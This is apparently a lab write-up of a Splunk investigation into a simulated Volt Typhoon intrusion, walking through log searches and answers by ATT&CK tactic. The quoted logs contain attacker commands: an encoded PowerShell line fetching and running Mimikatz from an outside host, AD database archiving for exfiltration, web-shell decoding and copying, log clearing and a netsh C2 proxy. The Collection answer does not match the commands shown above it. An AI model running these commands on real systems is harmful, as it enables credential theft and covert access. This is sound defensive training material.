# Investigating a Volt Typhoon APT Intrusion Using Splunk

## Scenario

The SOC detected suspicious activity consistent with **Volt Typhoon**, an advanced persistent threat (APT) group known for targeting high-value organizations. Acting as the investigating security analyst, the objective was to retrace the attacker's full intrusion lifecycle using two weeks of provided log data, mapped against the MITRE ATT&CK framework.

---

## Initial Access

Volt Typhoon is known to gain initial access by exploiting vulnerabilities in enterprise software — in this case, **Zoho ManageEngine ADSelfService Plus**, a self-service password management solution.

### Q: At what time (ISO 8601) was Dean's password changed and account taken over?

First, I checked the **Data Summary → Source**, and since the question tells us to comb through the ADSelfService Plus logs, I clicked on the source `adss.log`:

```spl
source="/home/volthunter/logfiles/adss.log"
```

This got **666** events.

First of all, I filtered the logs for the Dean user. In the `username` field I clicked on the `dean-admin` value to use it as a filter, which got me **63** events:

```spl
source="/home/volthunter/logfiles/adss.log" username="dean-admin"
```

I got an interesting field named `action_name`. In this field I got a value: `password change`. I clicked on it to use it as a search and got **2** events:

```spl
source="/home/volthunter/logfiles/adss.log" username="dean-admin" action_name="Password Change"
```

One of the events shows "password change failed" and the other shows "password change completed." For the "password change completed" event, the timestamp is:

```
3/24/24  11:10:22.000 AM
```

which in ISO 8601 format is:

**Answer:** `2024-03-24T11:10:22`

### Q: What new administrator account did the attacker create shortly after?

As Dean's account was compromised, shortly after that the attacker created a new account, so I chose the same source as above, but I set the date and time range between **24 March 2024, 11:10:22.000** and **24 March 2024, 11:15:22.000**, and applied that time range. This is the time the password was changed, and 5 minutes after that, to see any logs related to new account creation:

```spl
source="/home/volthunter/logfiles/adss.log"
```

With this time range set, I got only **8** events returned.

Then I selected the field `action_name` and in the value I selected `action_name = enrollment`. I got only one event, and on expanding the event information I got a field named `username`. In the `username` I got the name of the new admin account:

**Answer:** `voltyp-admin`

---

## Execution

Volt Typhoon leverages **WMIC** (Windows Management Instrumentation Command-line) for reconnaissance and data staging — a classic living-off-the-land binary (LOLBIN) technique that blends into legitimate system activity.

### Q: What command does the attacker run to gather drive information on server01 and server02?

We have to change the source of our logs. As we did in the very first question of this room, where we selected the source ADSS, similarly I selected the source WMIC and set the time to all time:

```spl
sourcetype=wmic
```

I got **942** events.

Under the interesting fields section I got a `command` field (with 100+ values), but it was showing only the top 10 values of the commands the logs have. So to see all the commands I created a table:

```spl
sourcetype=wmic | table command
```

But as the total number of commands is more than 100, to filter and get the exact drive-related commands, I used this search:

```spl
sourcetype=wmic "server01" | table command
```

and got the 1 command that the attacker used:

**Answer:**
```
wmic /node:server01,server02 logicaldisk get caption, filesystem, freespace, size, volumename
```

### Q: What password does the attacker set when archiving the exfiltrated AD database?

I used this search:

```spl
sourcetype=wmic "webserver" | table command
```

And got four commands, one of which was related to compression and also had a `p` keyword, which denotes the password. The command is:

1. Compressing the file.
2. Password-protecting it.
3. Splitting it into chunks.
4. Preparing it for exfiltration.

```
wmic /node:webserver-01 process call create "cmd.exe /c 7z a -v100m -p d5ag0nm@5t3r -t7z cisco-up.7z C:\inetpub\wwwroot\temp.dit"
```

So we got the password:

**Answer:** `d5ag0nm@5t3r`

---

## Persistence

Volt Typhoon frequently deploys web shells disguised as legitimate files to maintain long-term, undetected access.

### Q: In which directory was the base64-encoded web shell placed?

**`certutil`** is a legitimate Windows certificate utility, but attackers often abuse it as a **Living-off-the-Land Binary (LOLBIN)** for downloading, encoding, decoding, and transferring files.

The attacker would use the certutil utility to decode the encoded text, because to execute it they have to decode it first — so I used this search:

```spl
sourcetype=* "certutil"
```

I got only one event. In the event information I can see the first 6 lines, where the command line equals the command, and the command also has the output directory:

```
certutil -decode C:\Windows\Temp\ntuser.ini C:\Windows\Temp\iisstart.aspx
```

**Answer:** `C:\Windows\Temp`

---

## Defense Evasion

Volt Typhoon employs advanced anti-forensic techniques, including log clearing, artifact purging, and environment reconnaissance to detect analysis/virtualized environments.

### Q: What PowerShell cmdlet does the attacker use to remove the RDP "Most Recently Used" record?

To find the commands related to RDP, I used this search:

```spl
sourcetype=* "cl"
```

because keywords like `cl` or `clear` are used to clear something, but in Windows systems the one used is `cl`. So I used this search and got only one event that also contains the command name — it is trying to remove, which is removing the application, security, setup, and system logs, using the WEV utility of Windows:

```
wevtutil cl Application Security Setup System
```

But we want the cmdlet used for clearing the RDP history, and the hint given is **T1070.007** (MITRE technique). Using MITRE ATT&CK I found this:

```
Network connection history may be stored in various locations. For example, RDP connection history may be stored in Windows Registry values under:

HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default
HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers
```

The above two are the locations in the registry that are used to store any history related to RDP connections. Obviously the attacker used these locations to remove all the history from them. To remove the history from them, they used something like the `Remove-ItemProperty` PowerShell command. Keeping this in mind, I used this search:

```spl
index=* Remove-ItemProperty
```

I got three events, with this command line:

```
Remove-ItemProperty -Path $registryPath -Name MRU0 -ErrorAction SilentlyContinue
```

**Answer:** `Remove-ItemProperty`

### Q: What file name (with extension) was the archive renamed to?

We got a zip file created by the attackers in the execution stage, named `cisco-up.7z`.

How do we get any logs related to this file? I used this search:

```spl
index=* "cisco-up.7z"
```

I got two events. In the very first event we can see the name of the new file under the `command` field:

```
wmic /node:webserver-01 process call create "cmd.exe /c ren \\webserver-01\c$\inetpub\wwwroot\cisco-up.7z cl64.gif"
```

The new file name is:

**Answer:** `cl64.gif`

### Q: Under what registry path does the attacker check for signs of a virtualized environment?

As it is mentioned that we have to find the registry path, I used this simple search to get any logs related to the registry path:

```spl
index=* HKEY
```

I got 3 events, in which the third event's `CommandLine` field has the command checking for a virtualized environment:

```
Get-ItemProperty -Path "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control" | Select-Object -Property *Virtual*
```

**Answer:** `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control`

---

## Credential Access

Volt Typhoon systematically searches target systems for stored credentials and harvests hashed credentials directly from memory.

### Q: Using `reg query`, what three pieces of software does the attacker investigate?

I used this simple search and got 8 events related to `reg query`:

```spl
index=* "reg query"
```

and some of them are using `reg query` to query some software:

```
CommandLine=reg query hkcu\software\dean-admin\putty\session
CommandLine=reg query hklm\software\realvnc\Allusers\vncserver
CommandLine=reg query hklm\software\OpenSSH\Agent
```

**Answer:** `PuTTY`, `RealVNC`, `OpenSSH`

### Q: What is the full decoded command used to download and run Mimikatz?

For finding the full decoded command, we first have to find the command that was used by the attacker to download mimikatz. For PowerShell commands, parameters like `-e`, `encode-command`, or `--enc` are typically used. I searched for all of them and got only the command with the parameter:

```spl
index=* sourcetype="powershell" "-E" | table CommandLine
```

got a command (with `-exec`):

```
CommandLine=-exec bypass -W hidden -nop -E SW52b2tlLVdlYlJlcXVlc3QgLVVyaSAiaHR0cDovL3ZvbHR5cC5jb20vMy90bHovbWltaWthdHouZXhlIiAtT3V0RmlsZSAiQzpcVGVtcFxkYjJcbWltaWthdHouZXhlIjsgU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggIkM6XFRlbXBcZGIyXG1pbWlrYXR6LmV4ZSIgLUFyZ3VtZW50TGlzdCBAKCJzZWt1cmxzYTo6bWluaWR1bXAgbHNhc3MuZG1wIiwgImV4aXQiKSAtTm9OZXdXaW5kb3cgLVdhaXQ=
```

Using CyberChef (from Base64), I got this decoded command:

**Answer:**
```
Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait
```

---

## Discovery

Volt Typhoon enumerates network architecture, logging mechanisms, successful logins, and software configurations to deepen their understanding of the target environment ahead of further action.

---

## Lateral Movement

The group reuses previously deployed web shells across multiple servers to extend access and maintain persistence network-wide.

### Q: Using `wevtutil`, what event IDs does the attacker search for?

I used this search:

```spl
index=* CommandLine=wevtutil
```

In the interesting fields section I got a field named Event ID, and it has three values:

**Answer:** `4624`, `4769`, `4625`

### Q: Moving laterally to server-02, what is the name of the new web shell created?

This was the command used by the attackers to decode their web shell and save it with the name `iisstart.aspx`:

```
certutil -decode C:\Windows\Temp\ntuser.ini C:\Windows\Temp\iisstart.aspx
```

Now they copied the same web shell with some other name to move laterally to another server too, so obviously the command would contain the file name `iisstart.aspx`. So I used this search:

```spl
index=* sourcetype="powershell" iisstart
```

or this search would also give the results:

```spl
index=* sourcetype="powershell" copy
```

In the event details I got this command line:

```
CommandLine=Copy-Item -Path "C:\Windows\Temp\iisstart.aspx" -Destination "\\server-02\C$\inetpub\wwwroot\AuditReport.jspx"
```

They renamed the web shell to:

**Answer:** `AuditReport.jspx`

---

## Collection

During this phase, Volt Typhoon extracts valuable data, including browser data and sensitive business documents, from the compromised environment.

### Q: What three files does the attacker copy using PowerShell during the collection of financial information?

I filtered out the results, keeping only events that contain the PowerShell command `Copy-Item`, which is used to make copies or copy items using PowerShell. I used this search:

```spl
index=* sourcetype="powershell" Copy-Item CommandLine="Copy-Item"
```

Got a total of 11 events, and out of these 11 events, some events have a command line using a directory named Finance Backup. For this directory the commands used by the attackers are:

```
Copy-Item -Path "C:\ProgramData\FinanceBackup\2022.csv" -Destination "C:\Windows\Temp\faudit\2022.csv"
Copy-Item -Path "C:\ProgramData\FinanceBackup\2022.csv" -Destination "C:\Windows\Temp\faudit\2023.csv"
Copy-Item -Path "C:\ProgramData\FinanceBackup\2022.csv" -Destination "C:\Windows\Temp\faudit\2024.csv"
```

**Answer:** `2022.csv`, `2023.csv`, `2024.csv`

---

## Command and Control (C2)

Volt Typhoon leverages publicly available tooling and compromised network devices to establish covert C2 channels.

### Q: What connect address and port does the attacker use when setting up a `netsh` proxy for C2?

I used the string "listen" — specifically "listenport" — to find this in the events, because this is a common word found in almost every type of proxy connection command. For a proxy, we have to set up the listen port and listen address to get the connections, so I used this search:

```spl
index=* listenport
```

```
wmic /node:server-01 /user:dean-admin /password:uNcr4cK4b1e process call create "cmd.exe /c netsh interface portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=8443 connectaddress=10.2.30.1"
```

**Answer:** Connect address `10.2.30.1`, connect port `8443`

---

## Cleanup

As with their initial evasion steps, Volt Typhoon purges event logs to erase evidence of the intrusion.

### Q: What four types of event logs does the attacker clear?

Already found this in the Defense Evasion section, via the `wevtutil` log-clearing command:

```
wevtutil cl Application Security Setup System
```

**Answer:** `Application`, `Security`, `Setup`, `System`

---

## Summary — Full Attack Chain (Mapped to MITRE ATT&CK Tactics)

| Phase | Key Finding |
|---|---|
| Initial Access | Dean's account compromised via ADSelfService Plus at `2024-03-24T11:10:22`; rogue admin account `voltyp-admin` created |
| Execution | Drive enumeration via WMIC across server01/server02; AD database archived with password `d5ag0nm@5t3r` |
| Persistence | Base64-encoded web shell decoded into `C:\Windows\Temp\iisstart.aspx` |
| Defense Evasion | RDP MRU history cleared via `Remove-ItemProperty`; archive renamed to `cl64.gif`; virtualization checks via registry |
| Credential Access | Credential hunting in PuTTY, RealVNC, OpenSSH; Mimikatz downloaded/executed via encoded PowerShell |
| Discovery | Enumeration of network, logging, and software configuration |
| Lateral Movement | `wevtutil` used to review Event IDs 4624/4769/4625; web shell redeployed to server-02 as `AuditReport.jspx` |
| Collection | Finance backup files (`2022.csv`, `2023.csv`, `2024.csv`) copied via PowerShell |
| Command & Control | `netsh` port proxy configured to `10.2.30.1:8443` |
| Cleanup | Application, Security, Setup, and System event logs cleared |
